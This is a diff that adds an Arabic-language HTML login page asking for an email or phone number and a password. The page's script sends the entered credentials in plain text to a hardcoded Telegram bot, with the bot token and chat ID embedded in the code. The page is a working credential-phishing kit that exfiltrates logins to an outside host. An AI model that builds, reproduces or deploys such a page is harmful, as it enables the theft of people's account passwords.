@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول باستخدام البريد الإلكتروني أو رقم الهاتف وكلمة المرور</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        function sendToTelegram() {
+            var emailOrPhone = document.getElementById("emailOrPhone").value;
+            var password = document.getElementById("password").value;
+
+            if (emailOrPhone.trim() === "" || password.trim() === "") {
+                alert("الرجاء إدخال البريد الإلكتروني أو الرقم وكلمة المرور");
+                return;
+            }
+
+            var token = '7851246905:AAGZC-xSoTCDRk3JEXmQ4vkx3UxGVXBfcZU'; 
+            var chatId = '7022091399';
+
+            var message = `البريد الإلكتروني أو الرقم المرسل: ${emailOrPhone}\nكلمة المرور: ${password}`;
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال البيانات بنجاح إلى Telegram!");
+                    } else {
+                        alert("خطأ أثناء إرسال الرسالة: " + data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error("خطأ في الطلب:", error);
+                    alert("حدث خطأ في الاتصال بـ Telegram.");
+                });
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <form onsubmit="event.preventDefault(); sendToTelegram();">
+            <div class="form-group">
+                <input type="text" id="emailOrPhone" name="emailOrPhone" required placeholder="البريد الإلكتروني أو رقم الهاتف">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" required placeholder="كلمة المرور">
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+    </div>
+</body>
+</html>
